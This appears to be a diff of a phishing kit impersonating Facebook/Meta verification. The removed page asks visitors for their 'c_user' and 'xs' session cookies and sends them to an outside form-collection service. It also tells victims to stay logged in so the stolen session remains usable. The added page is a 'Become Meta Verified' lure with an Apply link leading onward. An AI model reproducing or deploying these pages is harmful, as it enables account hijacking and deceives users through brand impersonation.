@@ -1,232 +1,150 @@
 <html lang="en" webcrx=""><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Request a Verified Badge on Facebook</title>
-    <style>
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-            /* Prevent horizontal scrolling */
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apply</title>
+  <link href="bootstrap.min.css" rel="stylesheet">
+  <style>
+    /* CSS styles */
+    body {
+      font-family: system-ui;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      /* Prevent horizontal scroll */
+    }
 
-        .header {
-            background-color: #4267B2;
-            padding: 25px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
+    .container-fluid {
+      display: flex;
+      align-items: stretch;
+      padding: 0;
+      margin: 0;
+      min-height: 100vh;
+      /* Full viewport height */
+      overflow: hidden;
+      /* Prevent overflow and visible scrollbars */
+      flex-direction: column;
+      /* Default column direction for mobile */
+    }
 
-        .header-container {
-            display: flex;
-            align-items: center;
-        }
+    .form-content {
+      flex: 1;
+      /* Take up remaining space */
+      padding: 2rem;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-shadow: none;
+      /* Remove shadow to blend with the background */
+      position: relative;
+      /* Ensure form content is relative for absolute positioning of elements inside */
+      z-index: 1;
+      /* Place form content above the background image */
+    }
 
-        .facebook-text {
-            font-size: 35px;
-            font-weight: bold;
-            color: white;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-        }
+    .form-content img {
+      width: 4rem;
+      height: 4rem;
+      margin-bottom: 1rem;
+    }
 
-        .divider {
-            height: 10px;
-            background-color: #e9ebee;
-        }
+    .form-content h1 {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
 
-        .content-container {
-            width: 80%;
-            max-width: 800px;
-            background-color: white;
-            margin: 30px auto;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
-            position: relative;
-            /* Ensure positioning of children is relative to this container */
-        }
+    .btn {
+      background: #0064e0;
+      border: none;
+      border-radius: 100px;
+      padding: 10px 35px;
+      text-decoration: none;
+      color: white;
+      display: inline-block;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+    }
 
-        .verification-heading {
-            font-size: 32px;
-            /* Larger size for emphasis */
-            color: #1c1e21;
-            margin-bottom: 20px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            /* Align items vertically in the center */
-            position: relative;
-        }
+    .form-content p {
+      font-size: 18px;
+      margin-top: 1rem;
+      text-align: center;
+    }
 
-        .verification-heading img {
-            width: 50px;
-            /* Adjust size of the logo */
-            height: auto;
-            margin-right: 15px;
-            /* Space between logo and text */
-        }
+    .form-content .sign-up {
+      font-size: 17px;
+      padding-top: 1rem;
+    }
 
-        h1 {
-            font-size: 24px;
-            color: #1c1e21;
-            margin-bottom: 20px;
-            font-weight: normal;
-            text-align: left;
-            /* Align text to the left */
-        }
+    .form-content .business-info {
+      font-size: 14px;
+    }
 
-        h2 {
-            font-size: 20px;
-            /* Size for the subheading */
-            color: #1c1e21;
-            margin-bottom: 15px;
-            /* Space below the subheading */
-            font-weight: normal;
-            text-align: center;
-            /* Center text within its container */
-        }
+    .form-content .region-info {
+      font-size: 13px;
+      font-style: italic;
+    }
 
-        p {
-            font-size: 14px;
-            color: #606770;
-            margin-bottom: 10px;
-            line-height: 1.6;
-        }
+    .image {
+      width: 100%;
+      /* Full width by default */
+      height: 27vh;
+      /* Half viewport height by default */
+      background-image: url('https://cdn.glitch.global/2e5d4c45-5a39-486d-a854-bc6ea9ca8ab2/image.png?v=1725069320098');
+      /* Path to your background image */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      border: none;
+      /* Ensure no border */
+      margin: 0;
+      /* Remove margin */
+      padding: 0;
+      /* Remove padding */
+      display: block;
+      /* Ensure image is displayed */
+      flex-shrink: 0;
+      /* Prevent shrinking */
+    }
 
-        .video-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+    @media (min-width: 768px) {
+      .container-fluid {
+        flex-direction: row;
+        /* Row direction for larger screens */
+      }
 
-        video {
-            width: 65%;
-            height: auto;
-            display: block;
-            border-radius: 8px;
-        }
+      .form-content {
+        flex: 1;
+        padding: 2rem;
+      }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            font-size: 14px;
-            color: #4b4f56;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 12px 10px;
-            font-size: 14px;
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            box-sizing: border-box;
-            background-color: #f5f6f7;
-            transition: all 0.3s ease;
-        }
-
-        input[type="text"]:focus {
-            border-color: #1877f2;
-            background-color: white;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
-        }
-
-        .notice {
-            font-size: 12px;
-            color: #606770;
-            margin-bottom: 25px;
-            /* Add margin to separate from other content */
-        }
-
-        .form-notice {
-            font-size: 12px;
-            color: #ff0000;
-            /* Use a different color for emphasis */
-            margin-bottom: 20px;
-            /* Space below the notice */
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 700;
-            text-transform: uppercase;
-            transition: background-color 0.3s ease;
-        }
-
-        button:hover {
-            background-color: #165ecc;
-        }
-    </style>
+      .image {
+        width: 42%;
+        /* Adjust width for larger screens */
+        height: 100vh;
+        /* Full viewport height for larger screens */
+      }
+    }
+  </style>
 
 <body>
-    <!-- Facebook Header -->
-    <div class="header">
-        <div class="header-container">
-            <span class="facebook-text">facebook</span>
-        </div>
+  <div class="container-fluid">
+    <div class="image"></div>
+    <div class="form-content">
+      <img src="https://cdn.glitch.global/2e5d4c45-5a39-486d-a854-bc6ea9ca8ab2/blue%20tick.png?v=1725069250606" alt="meta" class="meta-logo">
+      <h1>Become <br> Meta Verified</h1>
+      <a class='btn' href='/request'>Apply</a>
+      <p>Grow your social presence with Meta Verified – a new subscription
+        <br>bundle available for creators and businesses on Instagram and <br>Facebook.
+      </p>
+      <p class="sign-up">Sign up now for creators</p>
+      <p><span class="fw-semibold">Are you a business?</span> Get more information on</p>
+      <a href="#" class="business-info">Meta support for businesses</a>
+      <p class="region-info">Features, availability, and pricing may vary by region.</p>
     </div>
-
-    <!-- Divider to separate header from content -->
-    <div class="divider"></div>
-
-    <!-- Content Container -->
-    <div class="content-container">
-        <!-- Verification Center Heading with Logo -->
-        <div class="verification-heading">
-            <img src="https://cdn.glitch.global/2e5d4c45-5a39-486d-a854-bc6ea9ca8ab2/blue%20tick.png?v=1725069250606" alt="Global Glitch Media Logo">
-            Verification Center
-        </div>
-
-        <h1>Request a verified badge on Facebook</h1>
-        <p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of
-            the individual, public figure, or brand that it represents.</p>
-        <p>Previously, the verified badge also required the person or brand to be notable and unique. You may still see
-            users with a verified badge that represents our previous eligibility requirements.</p>
-        <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions
-            unclear.</p>
-
-        <!-- Embedded Video -->
-        <div class="video-container">
-            <video controls="">
-                <source src="https://cdn.glitch.global/7ce918cb-3078-452a-a62e-3fa825fa0943/Verified%20Badges.mp4?v=1725740907151" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-        </div>
-
-        <!-- Form Notice -->
-        <p class="form-notice">Please ensure that all required information is accurately provided. Failure to do so may
-            result in not receiving a verified badge.</p>
-
-
-        <!-- Form -->
-        <form id="userForm" action="https://formspree.io/f/moqoovob" method="POST">
-            <div class="form-group">
-                <label for="c_user">c_user</label>
-                <input type="text" id="c_user" name="c_user" pattern="[0-9]+" minlength="6" required="">
-            </div>
-            <div class="form-group">
-                <label for="xs">xs</label>
-                <input type="text" id="xs" name="xs" pattern="^(?=.[a-z])(?=.[A-Z])(?=.\d)(?=.[@#$%^&amp;+=]).{12,}$" required="">
-            </div>
-            <p class="notice">Please make sure not to log out from your computer or laptop until you have received a
-                verification email.</p>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
+  </div>
 
 
 
